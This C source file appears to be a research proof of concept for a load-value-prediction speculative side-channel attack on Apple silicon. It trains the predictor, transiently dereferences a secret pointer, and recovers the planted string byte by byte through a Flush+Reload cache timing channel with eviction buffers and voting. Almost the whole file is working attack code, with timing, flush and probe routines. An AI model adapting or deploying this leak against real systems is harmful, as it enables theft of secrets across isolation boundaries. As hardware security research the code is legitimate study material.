#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <time.h>

#define PAGE_SZ 16384
#define CACHE_LINE_SZ 128
#define NUM_CACHELINES PAGE_SZ / CACHE_LINE_SZ //evaluates to 128
#define REPS 300
#define TRIALS 50
#define EVICT_SIZE (48UL * 1024 * 1024)
#define CACHE_HIT_THRESHOLD 250

#define READ(addr) (*(volatile uint32_t *)(addr))
#define FORCE_READ(addr, trash) (READ((uintptr_t)(addr) | (trash == 0xbaaaaad)))

// We attempt to read this string using the LVP.
const char *secret = "Mr and Mrs Dursley, of number four, Privet Drive, were proud to say that they were perfectly normal, thank you very much. They were the last people youd expect to be involved in anything strange or mysterious, because they just didnt hold with such nonsense.";

// Note: must serialize with isb and dsb ish
inline __attribute__((always_inline)) void clflush(void *ptr)
{
    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline))
uint64_t
rdtsc()
{
    uint64_t ts;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
    asm volatile("isb");
    return ts;
}

// For shuffling cacheline indices in an array as to randomize
// the memory access pattern.
void shuffle(volatile int *array, volatile int n)
{
    if (n > 1)
    {
        for (int i = 0; i < n - 1; i++)
        {
            volatile int j = i + rand() / (RAND_MAX / (n - i) + 1);
            volatile int temp = array[j];
            array[j] = array[i];
            array[i] = temp;
        }
    }
}

// Function to count matching bits between two chars
int countMatchingBits(char a, char b)
{
    int matchingBits = 0;
    char xorResult = a ^ b; // XOR the two chars

    // Count the number of zero bits in the XOR result
    for (int i = 0; i < 8; i++)
    {
        if (!(xorResult & (1 << i)))
        {
            matchingBits++;
        }
    }

    return matchingBits;
}

__attribute__((noinline)) void critical_section(void *page, volatile int *indices, volatile unsigned char *channel_ptr, unsigned char *dummy_ptr, unsigned char *secret_ptr, int iters)
{
    // During training, both pointers are dummies and the load
    // value is 0x0. Hence, only the dummy is touched. On the single attack run,
    // we give dummy and secret, but the load value is changed to 0x1. Hence,
    // architecturally, only the dummy should hit. However, with the LVP, the
    // 0x0 load value executes transiently, accessing the secret.
    unsigned char *aop[2];
    aop[0] = secret_ptr;
    aop[1] = dummy_ptr;

    register uint64_t trash = 0;
    for (int i = 0; i < iters; i++)
    {
        volatile int idx = indices[i % NUM_CACHELINES];
        trash = FORCE_READ((volatile char *)page + idx * CACHE_LINE_SZ, trash);

        // Use load value as index into AoP, deref the selected ptr,
        // and then transmit the result over cache channel.
        register unsigned char *ptr = aop[(uint8_t)trash];
        volatile unsigned char junk = channel_ptr[*ptr * PAGE_SZ];
    }
}

int main(int argc, char *argv[])
{
    // Initialize RNG for random page access.
    srand(time(NULL));

    // Set CPU affinity using KDK interface.
    uint32_t CORE_ID = 5;
    volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
    if (ret == -1)
    {
        printf("Error setting CPU core affinity. Please run as root\n");
        return EXIT_FAILURE;
    }

    // Allocate one test page and memset it
    // such that load values become constant.
    void *page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        printf("Failed to allocate page\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(page, 0x0, PAGE_SZ);
    }

    // Make array to hold the cacheline indices, then
    // shuffle the order of accesses.
    volatile int indices[NUM_CACHELINES];
    for (int i = 0; i < NUM_CACHELINES; i++)
    {
        indices[i] = i;
    }
    shuffle(indices, NUM_CACHELINES);

    // Allocate dummy page.
    void *dummy_page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *dummy_ptr;

    if (dummy_page == MAP_FAILED)
    {
        printf("Failed to allocate dummy pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(dummy_page, 0xff, PAGE_SZ);
        dummy_ptr = (unsigned char *)dummy_page;
    }

    // Allocate secret page.
    void *secret_page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *secret_ptr;

    if (secret_page == MAP_FAILED)
    {
        printf("Failed to allocate secret pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        strcpy((char *)secret_page, secret);
        secret_ptr = (unsigned char *)secret_page;
    }

    // Allocate the cache channel.
    void *channel_pages = mmap(NULL, 256 * PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *channel_ptr;

    if (channel_pages == MAP_FAILED)
    {
        printf("Failed to allocate cache channel pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(channel_pages, 0x99, 256 * PAGE_SZ);
        channel_ptr = (unsigned char *)channel_pages;
    }

    // Allocate SLC eviction buffer.
    // On M3 Max, dc civac only flushes to SLC (~102 cyc), not DRAM (~500 cyc).
    // Walking this buffer after dc civac pushes data from SLC to DRAM,
    // creating the timing gap needed for Flush+Reload.
    void *evict_buf = mmap(NULL, EVICT_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (evict_buf == MAP_FAILED)
    {
        printf("Failed to allocate eviction buffer\n");
        return EXIT_FAILURE;
    }
    memset(evict_buf, 0xAA, EVICT_SIZE);

    struct timespec start, end;
    double elapsed_time;
    char result[strlen(secret) + 1];
    result[strlen(secret)] = '\0';

    clock_gettime(CLOCK_MONOTONIC, &start);
    for (int pos = 0; pos < strlen(secret); pos++)
    {
        int votes[128] = {0};

        for (int trial = 0; trial < TRIALS; trial++)
        {
            // Need to reset page to 0x0
            memset(page, 0x0, PAGE_SZ);

            // Train the LVP. Here, the AoP only contains dummy pointers,
            // so the secret is never architecturally touched.
            critical_section(page, indices, channel_ptr, dummy_ptr, dummy_ptr, REPS);

            // Flush the cache channel array.
            for (int set = 0; set < 256; ++set)
            {
                clflush((void *)(channel_ptr + set * PAGE_SZ));
            }

            // Change the ground truth load value to be 1 instead of 0. This makes the arch
            // load value for the gadget 0x1, but LVP will predict 0x0.
            memset(page, 0x1, PAGE_SZ);

            // Flush the page's cachelines.
            for (int i = 0; i < NUM_CACHELINES; i++)
            {
                clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));
            }

            // SLC eviction: push channel and page data from SLC to DRAM.
            for (size_t off = 0; off < EVICT_SIZE; off += CACHE_LINE_SZ)
                (void)(*(volatile char *)((char *)evict_buf + off));
            
            asm volatile("dsb ish");
            asm volatile("isb");

            // Pre-warm secret byte into L1 so speculative chain can complete.
            (void)(*(volatile unsigned char *)(secret_ptr + pos));

            asm volatile("dsb ish");
            asm volatile("isb");

            // Load the same PC again, activating the LVP. Here, aop[0] will
            // have secret, and aop[1] will have dummy.
            critical_section(page, indices, channel_ptr, dummy_ptr, secret_ptr + pos, 1);

            // Measure the cache channel with randomized probe order
            // to defeat Apple's stride prefetcher.
            uint64_t timings[256];
            int probe_order[256];
            for (int i = 0; i < 256; i++) 
            {
                probe_order[i] = i;
            }
            
            shuffle(probe_order, 256);

            for (int i = 0; i < 256; ++i)
            {
                int pi = probe_order[i];
                uint64_t tstart = rdtsc();
                volatile unsigned char trash = channel_ptr[pi * PAGE_SZ];
                uint64_t tend = rdtsc();
                timings[pi] = tend - tstart;
            }

            // Post-probe flush to prevent cache hits bleeding into next trial.
            for (int set = 0; set < 256; ++set)
            {
                clflush((void *)(channel_ptr + set * PAGE_SZ));
            }

            asm volatile("dsb ish");
            asm volatile("isb");

            // Compute adaptive threshold from noise floor (median of all 256 timings).
            // Use 3/4 of median as threshold: permissive enough to capture real hits,
            // strict enough to reject noise when SLC eviction is incomplete.
/*             uint64_t sorted[256];
            for (int i = 0; i < 256; i++) sorted[i] = timings[i];
            for (int i = 0; i < 255; i++)
                for (int j = i + 1; j < 256; j++)
                    if (sorted[j] < sorted[i])
                    {
                        uint64_t tmp = sorted[i];
                        sorted[i] = sorted[j];
                        sorted[j] = tmp;
                    }
            uint64_t noise_floor = sorted[128];
            uint64_t adaptive_thresh = (noise_floor * 3) / 4;
            if (adaptive_thresh > CACHE_HIT_THRESHOLD)
                adaptive_thresh = CACHE_HIT_THRESHOLD; */

            // Find argmin in printable ASCII range [32, 127).
            // Vote if below adaptive threshold.
            int best_j = -1;
            uint64_t best_t = UINT64_MAX;
            for (int j = 32; j < 127; ++j)
            {
                if (timings[j] < best_t)
                {
                    best_t = timings[j];
                    best_j = j;
                }
            }
            if (best_j >= 32 && best_t < CACHE_HIT_THRESHOLD)
            {
                votes[best_j]++;
            }
        }

        // Pick the character with the most votes.
        result[pos] = 0x20;
        int max_votes = 0;
        for (int j = 32; j < 127; ++j)
        {
            if (votes[j] > max_votes)
            {
                max_votes = votes[j];
                result[pos] = (char)j;
            }
        }
    }
    clock_gettime(CLOCK_MONOTONIC, &end);

    int matchingBits = 0;
    for (int pos = 0; pos < strlen(secret); pos++)
    {
        matchingBits += countMatchingBits(result[pos], secret[pos]);
    }

    printf("Secret: %s\n", secret);
    printf("Output: %s\n", result);
    printf("%d bits out of %lu total bits match\n", matchingBits, strlen(secret) * 8);
    printf("Accuracy: %.2f\n", (double)matchingBits / (strlen(secret) * 8));

    elapsed_time = (end.tv_sec - start.tv_sec) +
                   (end.tv_nsec - start.tv_nsec) / 1E9;

    printf("Elapsed time: %.9f seconds\n", elapsed_time);

    // Clean up allocations.
    if (munmap(page, PAGE_SZ) == -1)
    {
        printf("Failed to deallocate page\n");
        return EXIT_FAILURE;
    }
    if (munmap(dummy_page, PAGE_SZ) == -1)
    {
        printf("Failed to deallocate dummy page\n");
        return EXIT_FAILURE;
    }
    if (munmap(secret_page, PAGE_SZ) == -1)
    {
        printf("Failed to deallocate secret page\n");
        return EXIT_FAILURE;
    }
    if (munmap(channel_pages, 256 * PAGE_SZ) == -1)
    {
        printf("Failed to deallocate cache channel pages\n");
        return EXIT_FAILURE;
    }
    if (munmap(evict_buf, EVICT_SIZE) == -1)
    {
        printf("Failed to deallocate eviction buffer\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}